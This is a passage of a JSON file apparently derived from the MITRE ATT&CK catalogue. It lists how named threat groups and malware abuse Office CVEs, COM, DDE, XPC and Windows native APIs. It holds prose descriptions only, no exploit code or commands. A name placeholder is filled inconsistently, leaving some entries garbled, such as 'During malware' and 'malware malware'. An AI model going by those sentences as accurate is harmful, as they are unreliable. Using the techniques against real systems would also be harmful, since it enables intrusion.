            },
            "G1003": {
                "ID": "G1003",
                "Name": "Ember Bear",
                "Description": "malware has exploited Microsoft Office vulnerability CVE-2017-11882.[46]"
            },
            "S0396": {
                "ID": "S0396",
                "Name": "EvilBunny",
                "Description": "malware has exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader.[47]"
            },
            "G1011": {
                "ID": "G1011",
                "Name": "EXOTIC LILY",
                "Description": "malware has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML.[48]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors exploited CVE-2017-11882 to execute code on the victim's machine.[49]"
            },
            "S0391": {
                "ID": "S0391",
                "Name": "HAWKBALL",
                "Description": "malware has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload.[50]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware has exploited CVE-2018-0798 for execution.[51]"
            },
            "G0100": {
                "ID": "G0100",
                "Name": "Inception",
                "Description": "malware has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.[52][53][54][55]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.[56]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.[24]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.[57][58][59][60]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has exploited the Office vulnerability CVE-2017-0199 for execution.[61]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has exploited CVE-2017-0199 in Microsoft Word to execute code.[62]"
            },
            "C0016": {
                "ID": "C0016",
                "Name": "Operation Dust Storm",
                "Description": "During malware, the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.[63]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.[64][65][66][67][68][69][70]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.[71][72]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).[73][74][75]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.[76][77]"
            },
            "S0374": {
                "ID": "S0374",
                "Name": "SpeakUp",
                "Description": "malware attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager. [78]"
            },
            "S0578": {
                "ID": "S0578",
                "Name": "SUPERNOVA",
                "Description": "malware was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).[79][80]"
            },
            "G0062": {
                "ID": "G0062",
                "Name": "TA459",
                "Description": "malware has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.[81]"
            },
            "G0089": {
                "ID": "G0089",
                "Name": "The White Company",
                "Description": "malware has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.[82]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has exploited CVE-2018-0798 in Equation Editor.[83]"
            },
            "G0131": {
                "ID": "G0131",
                "Name": "Tonto Team",
                "Description": "malware has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads.[84][85][86][87]"
            },
            "G0134": {
                "ID": "G0134",
                "Name": "Transparent Tribe",
                "Description": "malware has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.[88]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.[89][90]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware has relied on CVE-2022-30190 (Follina) for execution during delivery.[91]"
            },
            "S0341": {
                "ID": "S0341",
                "Name": "Xbash",
                "Description": "malware can attempt to exploit known vulnerabilities in Hadoop, Redis, or ActiveMQ when it finds those services running in order to conduct further execution.[92][93]"
            }
        }
    },
    "T1559": {
        "ttp_name": "Inter-Process Communication",
        "ttp_id": "T1559",
        "href": "/techniques/T1559",
        "subtechnique": {
            "001": {
                "name": "Component Object Model",
                "href": "/techniques/T1559/001",
                "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.[1] Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).[2] Remote COM execution is facilitated by Remote Services such as  Distributed Component Object Model (DCOM).[1]Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic.[2] Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.[1][3]",
                "Procedure": {
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can use a COM object to execute queries to gather system information.[4]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> has used the WshShortcut COM object to create a .lnk shortcut file in the Windows startup folder.[5]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> can use com objects identified with CLSID_ShellLink(IShellLink and IPersistFile) and WScript.Shell(RegWrite method) to enable persistence mechanisms.[6]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> malware can insert malicious macros into documents using a Microsoft.Office.Interop object.[7]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can use the IARPUinstallerStringLauncher COM interface are part of its UAC bypass process.[8]"
                    },
                    "S0698": {
                        "ID": "S0698",
                        "Name": "HermeticWizard",
                        "Description": "<name> can execute files on remote machines using DCOM.[9]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can use the ITaskService, ITaskDefinition and ITaskSettings COM interfaces to schedule a task.[10]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> can use a COM component to generate scheduled tasks.[11]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.[12][13][14]"
                    },
                    "S0691": {
                        "ID": "S0691",
                        "Name": "Neoichor",
                        "Description": "<name> can use the Internet Explorer (IE) COM interface to connect and receive commands from C2.[15]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> can use DCOM (targeting the 127.0.0.1 loopback address) to execute additional payloads on compromised hosts.[16]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can use the Windows COM API to schedule tasks and maintain persistence.[17]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> used COM to setup scheduled task for persistence.[18]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> droppers have used COM objects to execute the malware's full executable payload.[19]"
                    }
                }
            },
            "002": {
                "name": "Dynamic Data Exchange",
                "href": "/techniques/T1559/002",
                "description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.[1][2][3]Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.[4][5][6][7] Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.[8][9]DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter. DDE execution can be invoked remotely via Remote Services such as Distributed Component Object Model (DCOM).[10]",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents.[11][12][13]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has used Windows DDE for execution of commands and a malicious VBS.[14]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has executed OLE objects using Microsoft Equation Editor to download and run malicious payloads.[15]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has sent malicious Word OLE compound documents to victims.[16]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> spear phishing campaigns have included malicious Word documents with DDE execution.[17]"
                    },
                    "G0084": {
                        "ID": "G0084",
                        "Name": "Gallmaker",
                        "Description": "<name> attempted to exploit Microsoft\u2019s DDE protocol in order to gain access to victim machines and for execution.[18]"
                    },
                    "S0237": {
                        "ID": "S0237",
                        "Name": "GravityRAT",
                        "Description": "<name> has been delivered via Word documents using DDE for execution.[19]"
                    },
                    "S0391": {
                        "ID": "S0391",
                        "Name": "HAWKBALL",
                        "Description": "<name> has used an OLE object that uses Equation Editor to drop the embedded shellcode.[20]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> uses the Dynamic Data Exchange (DDE) protocol to download remote payloads.[21]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has utilized OLE as a method to insert malicious content inside various phishing documents. [22]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used malware that can execute PowerShell scripts via DDE.[23]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "During <name>, threat actors sent malicious Word OLE documents to victims.[24]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> leveraged the DDE protocol to deliver their malware.[25]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> was delivered with documents using DDE to execute malicious code.[26]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> can use DDE to execute additional payloads on compromised hosts.[27]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has been delivered using OLE objects in malicious documents.[28]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> can search for specific strings within browser tabs using a Dynamic Data Exchange mechanism.[29]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer.[30][31]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has leveraged malicious Word documents that abused DDE.[32]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> can execute tasks via OLE.[33]"
                    }
                }
            },
            "003": {
                "name": "XPC Services",
                "href": "/techniques/T1559/003",
                "description": "Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service C API or the high level NSXPCConnection API in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.[1][2]Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.[3][4] This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct Exploitation for Privilege Escalation.",
                "Procedure": {}
            }
        },
        "tactic": "Execution",
        "description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows Dynamic Data Exchange or Component Object Model. Linux environments support several different IPC mechanisms, two of which being sockets and pipes.[1] Higher level execution mediums, such as those of Command and Scripting Interpreters, may also leverage underlying IPC mechanisms. Adversaries may also use Remote Services such as Distributed Component Object Model to facilitate remote IPC execution.[2]",
        "Procedure": {
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware has the ability to create a pipe to enable inter-process communication.[3]"
            },
            "S0537": {
                "ID": "S0537",
                "Name": "HyperStack",
                "Description": "malware can connect to the IPC$ share on remote machines.[4]"
            },
            "S1100": {
                "ID": "S1100",
                "Name": "Ninja",
                "Description": "malware can use pipes to redirect the standard input and the standard output.[5]"
            },
            "S1123": {
                "ID": "S1123",
                "Name": "PITSTOP",
                "Description": "malware can listen over the Unix domain socket located at /data/runtime/cockpit/wd.fd.[6]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "When executing with non-root permissions, malware uses the the shmget API to create shared memory between other known malware processes. This allows processes to communicate with each other and share their PID.[7]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware has the ability to move data between its kernel and user mode components, generally using named pipes.[8]"
            }
        }
    },
    "T1106": {
        "ttp_name": "Native API",
        "ttp_id": "T1106",
        "href": "/techniques/T1106",
        "tactic": "Execution",
        "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.[1][2] These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.Native API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.[3][4][5] For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes.[6][7] This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.[8][9][10]Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.[11][12][13][14]Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.[15] Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
        "Procedure": {
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware is capable of starting a process using CreateProcess.[16]"
            },
            "S1129": {
                "ID": "S1129",
                "Name": "Akira",
                "Description": "malware executes native Windows functions such as GetFileAttributesW and GetSystemInfo.[17]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware has used a variety of Windows API calls, including GetComputerNameA, GetUserNameA, and CreateProcessA.[18]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware has the ability to use multiple dynamically resolved API calls.[19]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.[20]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has used the Windows API to execute code within a victim's system.[21]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to launch files using ShellExecute.[22]"
            },
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware has the ability to use OS APIs including CheckRemoteDebuggerPresent.[23]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware's dispatcher has used CreateProcessW API for execution.[24]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware has used the Windows Crypto API to generate an AES key.[25]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has used a variety of Windows API calls, including NtCurrentPeb and GetLogicalDrives.[26]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware can use multiple Windows API calls for actions on compromised hosts including discovery and execution.[27][28][29]"
            },
            "S0475": {
                "ID": "S0475",
                "Name": "BackConfig",
                "Description": "malware can leverage API functions such as ShellExecuteA and HttpOpenRequestA in the process of downloading and executing files.[30]"
            },
            "S0606": {
                "ID": "S0606",
                "Name": "Bad Rabbit",
                "Description": "malware has used various Windows API calls.[31]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can utilize Native API functions such as, ToolHelp32 and Rt1AdjustPrivilege to enable SeDebugPrivilege on a compromised machine.[32]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "malware has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.[33][34]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware has used the ShellExecuteW() function call.[35]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware creates processes using the Windows API calls: CreateProcessA() and CreateProcessAsUserA().[36]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can use various APIs to allocate memory and facilitate code execution/injection.[37]"
            },
            "S0470": {
                "ID": "S0470",
                "Name": "BBK",
                "Description": "malware has the ability to use the CreatePipe API to add a sub-process for execution via cmd.[38]"
            },
            "S0574": {
                "ID": "S0574",
                "Name": "BendyBear",
                "Description": "malware can load and execute modules and Windows Application Programming (API) calls using standard shellcode API hashing.[39]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has used the Windows API to communicate with the Service Control Manager to execute a thread.[40]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware has used dynamic API resolution to avoid identifiable strings within the binary, including RegEnumKeyW.[41]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware has the ability to use native APIs for numerous functions including discovery and defense evasion.[42][43][44][45]"
            },
            "G0098": {
                "ID": "G0098",
                "Name": "BlackTech",
                "Description": "malware has used built-in API functions.[46]"
            },
            "S0521": {
                "ID": "S0521",
                "Name": "BloodHound",
                "Description": "malware can use .NET API calls in the SharpHound ingestor component to pull Active Directory data.[47]"
            },
            "S0651": {
                "ID": "S0651",
                "Name": "BoxCaon",
                "Description": "malware has used Windows API calls to obtain information about the compromised host.[48]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can call multiple Windows APIs for execution, to share memory, and defense evasion.[49][50]"
            },
            "S0471": {
                "ID": "S0471",
                "Name": "build_downer",
                "Description": "malware has the ability to use the WinExec API to execute malware on a compromised host.[38]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can use multiple Native APIs.[51][52]"
            },
            "S0693": {
                "ID": "S0693",
                "Name": "CaddyWiper",
                "Description": "malware has the ability to dynamically resolve and use APIs, including SeTakeOwnershipPrivilege.[53]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.[54]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware used the CreateFileW() API function with read permissions to access downloaded payloads.[55]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used direct Windows system calls by leveraging Dumpert.[56]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can use Windows API including WinExec for execution.[57]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware has used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc().[58][59]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware's Beacon payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe[60][61][62]"
            },
            "S0126": {
                "ID": "S0126",
                "Name": "ComRAT",
                "Description": "malware can load a PE file from memory or the file system and execute it with CreateProcessW.[63]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware has used API calls during execution.[64][65]"
            },
            "S0614": {
                "ID": "S0614",
                "Name": "CostaBricks",
                "Description": "malware has used a number of API calls, including VirtualAlloc, VirtualFree, LoadLibraryA, GetProcAddress, and ExitProcess.[66]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware has used several built-in API functions for discovery like GetIpNetTable and NetShareEnum.[67]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware can use various Linux API functions including those for execution and discovery.[68]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware uses the native Windows API CallWindowProc() to decode and launch encoded shellcode payloads during execution.[69] malware can call kernel mode functions directly to hide the use of process hollowing methods during execution.[70]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can use a variety of API calls for persistence and defense evasion.[71]"
            },
            "S1033": {
                "ID": "S1033",
                "Name": "DCSrv",
                "Description": "malware has used various Windows API functions, including DeviceIoControl, as part of its encryption process.[72]"
            },
            "S1052": {
                "ID": "S1052",
                "Name": "DEADEYE",
                "Description": "malware can execute the GetComputerNameA and GetComputerNameExA WinAPI functions.[73]"
            },
            "S0354": {
                "ID": "S0354",
                "Name": "Denis",
                "Description": "malware used the IsDebuggerPresent, OutputDebugString, and SetLastError APIs to avoid debugging. malware used GetProcAddress and LoadLibrary to dynamically resolve APIs. malware also used the Wow64SetThreadContext API as part of a process hollowing process.[74]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware has used several API calls like GetLogicalDriveStrings, SleepEx, SystemParametersInfoAPI, CryptEncrypt, and others to execute parts of its attack.[75]"
            },
            "S0695": {
                "ID": "S0695",
                "Name": "Donut",
                "Description": "malware code modules use various API functions to load and inject code.[76]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can use various API calls to see if it is running in a sandbox.[77]"
            },
            "S0384": {
                "ID": "S0384",
                "Name": "Dridex",
                "Description": "malware has used the OutputDebugStringW function to avoid malware analysis as part of its anti-debugging technique.[78]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware has used the Windows API to make detection more difficult.[79]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has used CreateProcess to create a new process to run its executable and WNetEnumResourceW to enumerate non-hidden shares.[80]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware contains a variety of enumeration modules that have an option to use API calls to carry out tasks.[81]"
            },
            "S0396": {
                "ID": "S0396",
                "Name": "EvilBunny",
                "Description": "malware has used various API calls as part of its checks to see if the malware is running in a sandbox.[82]"
            },
            "S0569": {
                "ID": "S0569",
                "Name": "Explosive",
                "Description": "malware has a function to call the OpenClipboard wrapper.[83]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can call ShellExecuteW to open the default browser on the URL localhost.[84]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware can use Native API to enable obfuscation including GetLastError and GetTickCount.[85]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware's loader can use API functions to load the malware backdoor into the same Application Domain within which the legitimate AD FS managed code is executed.[86]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can use Native API for defense evasion, discovery, and collection.[87]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware malware has used CreateProcess to launch additional malicious components.[88]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware has the ability to use various Windows API functions to perform tasks.[57]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware has used the InterlockedExchange, SeShutdownPrivilege, and ExitWindowsEx Windows API functions.[89]"
            },
            "S0493": {
                "ID": "S0493",
                "Name": "GoldenSpy",
                "Description": "malware can execute remote commands in the Windows command shell using the WinExec() API.[90]"
            },
            "S0477": {
                "ID": "S0477",
                "Name": "Goopy",
                "Description": "malware has the ability to  enumerate the infected system's user name via GetUserNameW.[74]"
            },
            "G0078": {
                "ID": "G0078",
                "Name": "Gorgon Group",
                "Description": "malware malware can leverage the Windows API call, CreateProcessA(), for execution.[91]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can execute through the WinExec API.[92]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware can use Native API including GetProcAddress and ShellExecuteW.[93]"
            },
            "S0561": {
                "ID": "S0561",
                "Name": "GuLoader",
                "Description": "malware can use a number of different APIs for discovery and execution.[94]"
            },
            "S0499": {
                "ID": "S0499",
                "Name": "Hancitor",
                "Description": "malware has used CallWindowProc and EnumResourceTypesA to interpret and execute shellcode.[95]"
            },
            "S0391": {
                "ID": "S0391",
                "Name": "HAWKBALL",
                "Description": "malware has leveraged several Windows API calls to create processes, gather disk information, and detect debugger activity.[96]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can call multiple Windows API functions used for privilege escalation, service execution, and to overwrite random bites of data.[97][98][99][100]"
            },
            "S0698": {
                "ID": "S0698",
                "Name": "HermeticWizard",
                "Description": "malware can connect to remote shares using WNetAddConnection2W.[99]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware has called various native OS APIs.[101]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware can perform dynamic DLL importing and API lookups using LoadLibrary and GetProcAddress on obfuscated strings.[102]"
            },
            "S0398": {
                "ID": "S0398",
                "Name": "HyperBro",
                "Description": "malware has the ability to run an application (CreateProcessW) or script/file (ShellExecuteW) via API.[103]"
            },
            "S0537": {
                "ID": "S0537",
                "Name": "HyperStack",
                "Description": "malware can use Windows API's ConnectNamedPipe and WNetAddConnection2 to detect incoming connections and connect to remote shares.[104]"
            },
            "S0483": {
                "ID": "S0483",
                "Name": "IcedID",
                "Description": "malware has called ZwWriteVirtualMemory, ZwProtectVirtualMemory, ZwQueueApcThread, and NtResumeThread to inject itself into a remote process.[105]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has leveraged CreateProcessW() call to execute the debugger.[106]"
            },
            "S0259": {
                "ID": "S0259",
                "Name": "InnaputRAT",
                "Description": "malware uses the API call ShellExecuteW for execution.[107]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can use winapiexec tool for indirect execution of  ShellExecuteW and CreateProcessA.[108]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can use the ShowWindow API to avoid detection.[109]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware has called the Windows API to retrieve the hard disk handle and shut down the machine.[110]"
            },
            "S0669": {
                "ID": "S0669",
                "Name": "KOCTOPUS",
                "Description": "malware can use the LoadResource and CreateProcessW APIs for execution.[111]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware has hardcoded API calls within its functions to use on the victim's machine.[112]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
